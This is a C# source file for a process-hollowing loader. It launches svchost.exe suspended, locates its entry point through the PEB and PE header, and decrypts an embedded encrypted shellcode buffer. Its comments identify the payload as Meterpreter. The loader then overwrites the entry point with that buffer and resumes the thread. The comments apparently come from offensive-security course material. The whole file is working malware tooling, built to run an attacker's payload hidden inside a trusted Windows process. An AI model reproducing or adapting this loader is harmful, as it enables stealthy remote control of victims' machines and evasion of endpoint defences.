﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Threading;
using System.Text;
using System.Threading.Tasks;

namespace ProcessHollowingExe
{
    class Program
    {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);


        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
               IntPtr hProcess,
               IntPtr lpBaseAddress,
               byte[] lpBuffer,
               Int32 nSize,
               out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(
                 null,
                "C:\\Windows\\System32\\svchost.exe",
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                0x4,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            //fetch the address of the PEB from the PROCESS_BASIC_INFORMATION structure
            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            //The ptrToImageBase variable now contains a pointer to the image base of svchost.exe
            //Following the DllImport, we can call ReadProcessMemory by specifying an 8 - byte buffer that is
            //then converted to a 64bit integer through the BitConverter.ToInt64278 method and then casted to a
            //pointer using (IntPtr)
            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);
            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            //The following step is to parse the PE header to locate the EntryPoint.This is performed by calling
            //ReadProcessMemory again with a buffer size of 0x200 bytes
            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            //To parse the PE header, we must read the content at offset 0x3C and use that as a second offset
            //when added to 0x28 convert the four bytes at offset e_lfanew plus 0x28 into an unsigned integer. 
            //This value is the offset from the image base to the EntryPoint
            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);
            uint opthdr = e_lfanew_offset + 0x28;
            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            //The offset from the base address of svchost.exe to the EntryPoint is also called the relative virtual
            //address(RVA).We must add it to the image base to obtain the full memory address of the EntryPoint.
            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
            //This is encryped/shifted using the project
            //https://github.com/sbridgens/ProcessHollowing/tree/main/ShellCodeEncrypter
            byte[] buf = new byte[] {
                0xb3,0x77,0xe4,0xa4,0xba,0xe3,0x83,0x4d,0x39,0x9a,0x50,0x5c,0xc6,0xfc,0x28,0x55,0x15,
                0xe2,0xe8,0x55,0xf2,0xba,0xa7,0x35,0xc8,0x9e,0xe0,0x62,0xf8,0x96,0x73,0x70,0x70,0x21,
                0x13,0x3c,0xcb,0x1c,0x52,0x67,0x75,0x3a,0x6a,0x0a,0x82,0xbd,0x1d,0xa1,0x27,0xc0,0xfd,
                0x9b,0x3d,0xa0,0xfd,0x20,0xcc,0x7b,0xa3,0x61,0x67,0x5b,0xf7,0xe3,0x34,0xc4,0x75,0xbc,
                0x3e,0xf4,0x84,0xb1,0x9b,0xff,0xc3,0x47,0xb7,0x3e,0x08,0x4b,0x53,0x87,0xaf,0x58,0x4b,
                0x45,0xe3,0x90,0x1e,0xee,0x2a,0xaf,0x6f,0xe8,0xa7,0x59,0x35,0xee,0x2b,0x90,0x60,0x55,
                0x20,0x77,0x8c,0x21,0x16,0x9f,0xbe,0x2f,0xd9,0xf2,0x5c,0x1a,0x5b,0xac,0x04,0x25,0x97,
                0xb7,0x91,0x12,0xba,0x15,0xf1,0xd4,0x30,0x49,0xa9,0xe1,0x98,0xa3,0xd4,0x69,0x65,0x11,
                0x85,0x50,0xd3,0x1f,0xa9,0xbe,0x07,0x31,0x3a,0xcd,0xa8,0x0f,0x3d,0x1d,0x1b,0x79,0x68,
                0x54,0x60,0xaf,0x29,0x03,0xbf,0x3a,0x16,0x56,0xbf,0x94,0x9f,0x31,0x43,0xb1,0xb9,0x5e,
                0x42,0x13,0x63,0xa3,0xb5,0x8b,0x8d,0xf4,0xb5,0x78,0x88,0xb2,0x5a,0x4f,0x03,0xd8,0xaf,
                0xf4,0xf8,0x46,0x63,0xf4,0x7e,0x83,0x67,0x4d,0x73,0x6f,0x5f,0xa6,0x57,0x61,0x11,0xd6,
                0xeb,0x69,0x2e,0x7a,0xfc,0xd3,0x3a,0x8c,0x1d,0x6e,0x3c,0xb4,0xa2,0xcd,0xdf,0x58,0x43,
                0x40,0x1f,0x4e,0x88,0xf4,0xae,0xf6,0x7f,0x75,0x9a,0xdf,0xb7,0xa4,0xef,0x38,0x11,0x37,
                0x30,0x55,0xb7,0x3c,0xe2,0x0e,0x17,0x82,0xfe,0x11,0x20,0xb8,0xb9,0x01,0x9f,0xc6,0x32,
                0x42,0x21,0x1c,0x42,0xa7,0x8f,0x71,0xd8,0xc3,0x5f,0x22,0x91,0xf6,0xad,0x17,0xb6,0x40,
                0x0a,0x22,0x48,0x1d,0xf6,0x8b,0x98,0xf4,0x2c,0xdb,0xb6,0x87,0x5a,0xc4,0xfb,0x63,0x60,
                0x06,0x96,0xbe,0x58,0x21,0x5e,0x8f,0x0f,0xe3,0x9c,0x73,0x94,0x96,0xfd,0x3b,0x35,0x9f,
                0x0f,0xe5,0x77,0x18,0xd9,0x0f,0x25,0x38,0xcc,0x1d,0xbb,0x84,0x52,0x09,0x93,0xf9,0xd4,
                0xda,0x7a,0x11,0xfa,0xd6,0xc6,0x75,0xba,0xf6,0x02,0x26,0x80,0xb0,0xb1,0x12,0xb5,0x54,
                0x47,0xd6,0x15,0x3e,0xb8,0x8d,0xb3,0x78,0x14,0x49,0xc1,0x89,0x75,0x55,0x6b,0xe1,0xa1,
                0x1c,0x3b,0xd6,0x90,0xae,0x62,0x69,0xa8,0x9b,0xeb,0x89,0x9b,0xaf,0x6d,0xb3,0xee,0xb6,
                0xcd,0xd5,0x84,0x81,0xbc,0x3a,0x47,0xfe,0x5f,0xb0,0xdf,0x59,0xec,0xd0,0xb8,0x2b,0x12,
                0xb9,0xa7,0x76,0x75,0xda,0x3b,0x93,0xdf,0xd1,0x5c,0x9a,0x23,0xcd,0x1d,0x04,0x37,0x2c,
                0xa3,0xd3,0x01,0x09,0xe3,0xed,0xed,0x96,0xec,0x67,0x90,0x49,0x3e,0x78,0xb3,0x15,0x00,
                0xa2,0x7f,0xc9,0xed,0x5b,0xdd,0xf4,0x31,0xd1,0xac,0xa1,0xe7,0xcf,0x1d,0x37,0x77,0xec,
                0x45,0x4c,0x27,0xd1,0xcd,0x25,0xb0,0x9f,0xcd,0x63,0xcd,0xe1,0x3d,0xc0,0x50,0x71,0x19,
                0xec,0x03,0xdd,0xf7,0xe5,0x88,0xbf,0x83,0xe3,0x73,0x09,0x8d,0x1f,0x67,0xe2,0x79,0xc6,
                0x36,0xda,0xb3,0x2b,0xaa,0x09,0x17,0x4a,0xea,0x8d,0x1a,0xa5,0x4e,0xb8,0xe9,0xf9,0x63,
                0x97,0xa9,0xe3,0xf9,0xf1,0xb2,0xea,0x02,0xdc,0xd4,0x00,0x9c,0x2c,0xff,0x1e,0xf3,0xe5,
                0x62,0x05
            };

            buf = PFuncs.CaesarDecrypt(buf, args[0], Convert.FromBase64String(args[1]));

            //We have obtained the address of the EntryPoint so we can generate our Meterpreter shellcode
            //and use WriteProcessMemory to overwrite the existing code as shown in Listing 202.Remember
            //that we must add a DllImport statement for WriteProcessMemory before using it.
            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            //When CreateProcessW started svchost.exe and populated the PROCESS_INFORMATION
            //structure, it also copied the handle of the main thread into it. 
            //We can then import ResumeThread and call it directly.
            ResumeThread(pi.hThread);
        }
    }
}

